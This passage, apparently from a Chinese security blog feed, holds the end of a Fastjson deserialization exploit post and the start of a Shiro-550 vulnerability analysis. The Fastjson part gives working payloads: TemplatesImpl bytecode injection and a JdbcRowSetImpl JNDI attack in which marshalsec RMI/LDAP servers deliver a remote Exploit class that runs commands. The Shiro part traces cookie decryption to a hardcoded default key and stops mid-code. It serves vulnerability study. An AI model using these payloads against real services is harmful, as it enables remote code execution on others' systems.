punctuation">(</span><span class="token class-name">String</span> args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token class-name">String</span> evilCode <span class="token operator">=</span> <span class="token function">readClass</span><span class="token punctuation">(</span><span class="token string">"F:/Calc.class"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token constant">NASTY_CLASS</span> <span class="token operator">=</span> <span class="token string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> payload <span class="token operator">=</span> <span class="token string">"{\"@type\":\""</span> <span class="token operator">+</span> <span class="token constant">NASTY_CLASS</span> <span class="token operator">+</span> <span class="token string">"\","</span> <span class="token operator">+</span>                    <span class="token string">"\"_bytecodes\":[\""</span> <span class="token operator">+</span> evilCode <span class="token operator">+</span> <span class="token string">"\"],"</span> <span class="token operator">+</span>                    <span class="token string">"\"_name\":\"value\","</span> <span class="token operator">+</span>                    <span class="token string">"\"_tfactory\":{ },"</span> <span class="token operator">+</span>                    <span class="token string">"\"_outputProperties\":{ }"</span> <span class="token operator">+</span>                    <span class="token string">"}"</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Object</span> obj <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Feature<span class="token punctuation">.</span>SupportNonPublicField</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中 type 值为要利用的 TemplatesImpl 类，_bytecodes 为 恶意类的 base64 编码值</p><h3 id="3-3小结"><a href="#3-3小结" class="headerlink" title="3.3小结"></a>3.3小结</h3><p>由于 outputProperties 为私有属性所以在反序列化时需要引入字段 Feature.SupportNonPublicField，而该字段在 Fastjson 1.2.22 时才加入，所以该 poc 只能在 Fastjson 1.2.22 - 1.2.24 利用</p><h2 id="4-JdbcRowSetImpl"><a href="#4-JdbcRowSetImpl" class="headerlink" title="4. JdbcRowSetImpl"></a>4. JdbcRowSetImpl</h2><p>简单来讲就是通过 JNDI 注入的方式进行攻击 </p><p>主要有两种利用方式 JNDI + RMI 与 JNDI + LDAP</p><h3 id="4-1-RMI"><a href="#4-1-RMI" class="headerlink" title="4.1 RMI"></a>4.1 RMI</h3><p>使用 marshalsec 开启 RMI 服务端口为 10066</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <span class="token string">"http://192.168.0.104:10065/#Exploit"</span> <span class="token number">10066</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编写恶意类</p><ul><li>Exploit.java</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exploit</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token class-name">Exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> cmds <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"os.name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"win"</span><span class="token punctuation">)</span>                    <span class="token operator">?</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"cmd.exe"</span><span class="token punctuation">,</span><span class="token string">"/c"</span><span class="token punctuation">,</span> <span class="token string">"calc.exe"</span><span class="token punctuation">}</span>                    <span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"touch /tmp/hacked"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmds<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>     <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">Exploit</span> e <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编译为 Exploit.class，然后使用 python 开一个简单地 http 服务</p><p>编写反序列化</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exploit</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">String</span> payload <span class="token operator">=</span> <span class="token string">"{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://192.168.0.104:10066/Exploit\", \"autoCommit\":true}"</span><span class="token punctuation">;</span>        <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果</p><p><img src="/../../../../../pic/image-20230208025516218.png"></p><p><img src="/../../../../../pic/image-20230208025534616.png"></p><p><img src="/../../../../../pic/image-20230208025545173.png"></p><h3 id="4-2-LDAP"><a href="#4-2-LDAP" class="headerlink" title="4.2 LDAP"></a>4.2 LDAP</h3><p>marshalsec 开启 LDAP 服务端口为 9999</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="token string">"http://192.168.0.104:10065/#Exploit"</span> <span class="token number">9999</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/image-20230208025815149.png"></p><p>一样可以实现</p><h2 id="5-参考链接"><a href="#5-参考链接" class="headerlink" title="5. 参考链接"></a>5. 参考链接</h2><p><a href="https://www.mi1k7ea.com/2019/11/03/Fastjson%E7%B3%BB%E5%88%97%E4%B8%80%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/">Fastjson系列一——反序列化漏洞基本原理</a></p>]]></content>
      
      
      <categories>
          
          <category> Java 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fastjson 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 框架 Shiro 篇 Shiro550 漏洞分析</title>
      <link href="/2023/02/07/skilllearning/java-an-quan/java-fan-xu-lie-hua/shiro-pian/java-kuang-jia-shiro-pian-shiro550-lou-dong-fen-xi/"/>
      <url>/2023/02/07/skilllearning/java-an-quan/java-fan-xu-lie-hua/shiro-pian/java-kuang-jia-shiro-pian-shiro550-lou-dong-fen-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="Java-框架-Shiro-篇-Shiro550-漏洞分析"><a href="#Java-框架-Shiro-篇-Shiro550-漏洞分析" class="headerlink" title="Java 框架 Shiro 篇 Shiro550 漏洞分析"></a>Java 框架 Shiro 篇 Shiro550 漏洞分析</h1><h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>shiro 是一款轻量化的权限管理框架，能够较方便的实现用户验权，请求拦截等功能</p><p>参考链接：<a href="https://www.cnblogs.com/progor/p/10970971.html#shiro%E5%8A%9F%E8%83%BD"></a><a href="https://www.cnblogs.com/progor/p/10970971.html">Shiro的基本使用</a></p><h2 id="2-环境搭建"><a href="#2-环境搭建" class="headerlink" title="2. 环境搭建"></a>2. 环境搭建</h2><p>我这里直接使用了 P 神搭建好的环境 <a href="https://github.com/phith0n/JavaThings">https://github.com/phith0n/JavaThings</a></p><p><img src="/../../../../../pic/image-20230202025921564.png"></p><p>默认用户为  root / secret</p><h2 id="3-Shiro550-漏洞分析"><a href="#3-Shiro550-漏洞分析" class="headerlink" title="3. Shiro550 漏洞分析"></a>3. Shiro550 漏洞分析</h2><h3 id="3-1-漏洞原理"><a href="#3-1-漏洞原理" class="headerlink" title="3.1 漏洞原理"></a>3.1 漏洞原理</h3><p>勾选 RememberMe 字段，登陆成功的话，返回包 set-Cookie 会有 rememberMe=deleteMe 字段，还会有 rememberMe 字段，之后的所有请求中 Cookie 都会有 rememberMe 字段，那么就可以利用这个 rememberMe 进行反序列化，从而 getshell。</p><p><img src="/../../../../../pic/Pasted-image-20230120214359.png"></p><p>Shiro1.2.4 及之前的版本中，AES 加密的密钥默认硬编码在代码里（Shiro-550），Shiro 1.2.4 以上版本官方移除了代码中的默认密钥，要求开发者自己设置，如果开发者没有设置，则默认动态生成，降低了固定密钥泄漏的风险。</p><h3 id="3-2-漏洞角度分析-Cookie"><a href="#3-2-漏洞角度分析-Cookie" class="headerlink" title="3.2 漏洞角度分析 Cookie"></a>3.2 漏洞角度分析 Cookie</h3><p>我们还是从一个漏洞发现者的角度出发，而不是跟着 IDEA 打断点走一遍就可以的。</p><p>首先在抓包的情况下，我们在拿到这一 Cookie 的时候，很明显能够看到这是经过某种加密的。因为我们平常的 Cookie 都是比较短的，而 shiro RememberMe 字段的 Cookie 太长了。</p><p>如此，我们先去分析 Cookie 的加密过程。</p><p>我们在知晓 Shiro 的加密过程之后，可以人为构造恶意的 Cookie 参数，从而实现命令执行的目的</p><p>这很重要！并不是知道了怎么加密解密之后就可以 RCE 的！</p><h3 id="3-3-逆向分析解密过程"><a href="#3-3-逆向分析解密过程" class="headerlink" title="3.3 逆向分析解密过程"></a>3.3 逆向分析解密过程</h3><p>要找 Cookie 的加密过程，直接在 IDEA 里面全局搜索 Cookie，去找 Shiro 包里的类。</p><p>最后我们找到相关的类是 CookieRememberMeManager，其中，在观察了一圈之后，将目光锁定到 getRememberedSerializedIdentity() 这个方法上。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getRememberedSerializedIdentity</span><span class="token punctuation">(</span><span class="token class-name">SubjectContext</span> subjectContext<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">WebUtils</span><span class="token punctuation">.</span><span class="token function">isHttp</span><span class="token punctuation">(</span>subjectContext<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>log<span class="token punctuation">.</span><span class="token function">isDebugEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token class-name">String</span> msg <span class="token operator">=</span> <span class="token string">"SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a "</span> <span class="token operator">+</span>                        <span class="token string">"servlet request and response in order to retrieve the rememberMe cookie. Returning "</span> <span class="token operator">+</span>                        <span class="token string">"immediately and ignoring rememberMe operation."</span><span class="token punctuation">;</span>                log<span class="token punctuation">.</span><span class="token function">debug</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token class-name">WebSubjectContext</span> wsc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">WebSubjectContext</span><span class="token punctuation">)</span> subjectContext<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isIdentityRemoved</span><span class="token punctuation">(</span>wsc<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token class-name">HttpServletRequest</span> request <span class="token operator">=</span> <span class="token class-name">WebUtils</span><span class="token punctuation">.</span><span class="token function">getHttpRequest</span><span class="token punctuation">(</span>wsc<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HttpServletResponse</span> response <span class="token operator">=</span> <span class="token class-name">WebUtils</span><span class="token punctuation">.</span><span class="token function">getHttpResponse</span><span class="token punctuation">(</span>wsc<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> base64 <span class="token operator">=</span> <span class="token function">getCookie</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// Browsers do not always remove cookies immediately (SHIRO-183)</span>        <span class="token comment">// ignore cookies that are scheduled for removal</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Cookie</span><span class="token punctuation">.</span><span class="token constant">DELETED_COOKIE_VALUE</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>base64<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>base64 <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            base64 <span class="token operator">=</span> <span class="token function">ensurePadding</span><span class="token punctuation">(</span>base64<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>log<span class="token punctuation">.</span><span class="token function">isTraceEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                log<span class="token punctuation">.</span><span class="token function">trace</span><span class="token punctuation">(</span><span class="token string">"Acquired Base64 encoded identity ["</span> <span class="token operator">+</span> base64 <span class="token operator">+</span> <span class="token string">"]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> decoded <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>base64<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>log<span class="token punctuation">.</span><span class="token function">isTraceEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                log<span class="token punctuation">.</span><span class="token function">trace</span><span class="token punctuation">(</span><span class="token string">"Base64 decoded byte array length: "</span> <span class="token operator">+</span> <span class="token punctuation">(</span>decoded <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">?</span> decoded<span class="token punctuation">.</span>length <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" bytes."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span> decoded<span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token comment">//no cookie set - new site visitor?</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该部分方法先获取到 Cookie 中的 rememberMe，然后判断是否为 deleteMe，不是则判断是否是符合 base64 的编码长度，然后再对其进行 base64 解码，将解码结果返回。</p><p>看一下哪里调用了该部分方法获取 Cookie</p><p><img src="/../../../../../pic/Pasted-image-20230120220326.png"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">PrincipalCollection</span> <span class="token function">getRememberedPrincipals</span><span class="token punctuation">(</span><span class="token class-name">SubjectContext</span> subjectContext<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">PrincipalCollection</span> principals <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token function">getRememberedSerializedIdentity</span><span class="token punctuation">(</span>subjectContext<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">//SHIRO-138 - only call convertBytesToPrincipals if bytes exist:</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>bytes <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> bytes<span class="token punctuation">.</span>length <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                principals <span class="token operator">=</span> <span class="token function">convertBytesToPrincipals</span><span class="token punctuation">(</span>bytes<span class="token punctuation">,</span> subjectContext<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">RuntimeException</span> re<span class="token punctuation">)</span> <span class="token punctuation">{</span>            principals <span class="token operator">=</span> <span class="token function">onRememberedPrincipalFailure</span><span class="token punctuation">(</span>re<span class="token punctuation">,</span> subjectContext<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> principals<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将 Base64 解码后的内容丢到 <code>convertBytesToPrincipals()</code> 进行处理，继续跟进 <code>convertBytesToPrincipals()</code></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token class-name">PrincipalCollection</span> <span class="token function">convertBytesToPrincipals</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes<span class="token punctuation">,</span> <span class="token class-name">SubjectContext</span> subjectContext<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getCipherService</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            bytes <span class="token operator">=</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token function">deserialize</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>现将传入内容进行解密，然后进行反序列化操作，先跟进 <code>decrypt()</code></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> encrypted<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> serialized <span class="token operator">=</span> encrypted<span class="token punctuation">;</span>        <span class="token class-name">CipherService</span> cipherService <span class="token operator">=</span> <span class="token function">getCipherService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>cipherService <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token class-name">ByteSource</span> byteSource <span class="token operator">=</span> cipherService<span class="token punctuation">.</span><span class="token function">decrypt</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">,</span> <span class="token function">getDecryptionCipherKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            serialized <span class="token operator">=</span> byteSource<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> serialized<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先获取一个加密服务，然后使用 key 进行解密</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> decryptionCipherKey<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getDecryptionCipherKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> decryptionCipherKey<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setDecryptionCipherKey</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> decryptionCipherKey<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>decryptionCipherKey <span class="token operator">=</span> decryptionCipherKey<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>继续向上跟进查看哪里写入了该秘钥</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token constant">DEFAULT_CIPHER_KEY_BYTES</span> <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token string">"kPH+bIxk5D2deZiIxcaaaA=="</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token class-name">AbstractRememberMeManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>serializer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DefaultSerializer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">PrincipalCollection</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>cipherService <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AesCipherService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setCipherKey</span><span class="token punctuation">(</span><span class="token constant">DEFAULT_CIPHER_KEY_BYTES</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setCipherKey</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> cipherKey<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">//Since this method should only be used in symmetric ciphers</span>        <span class="token comment">//(where the enc and dec keys are the same), set it on both:</span>        <span class="token function">setEncryptionCipherKey</span><span class="token punctuation">(</span>cipherKey<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setDecryptionCipherKey</span><span class="token punctuation">(</span>cipherKey<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>找到了最后使用到的秘钥</p><p>再回头看一下反序列化的过程</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token class-name">PrincipalCollection</span> <span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> serializedIdentity<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">getSerializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">deserialize</span><span class="token punctuation">(</span>serializedIdentity<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token class-name">T</span> <span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> serialized<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SerializationException</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>serialized <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">String</span> msg <span class="token operator">=</span> <span class="token string">"argument cannot be null."</span><span class="token punctuation">;</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token class-name">ByteArrayInputStream</span> bais <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>serialized<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">BufferedInputStream</span> bis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedInputStream</span><span class="token punctuation">(</span>bais<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClassResolvingObjectInputStream</span><span class="token punctuation">(</span>bis<span class="token punctuation">)</span><span 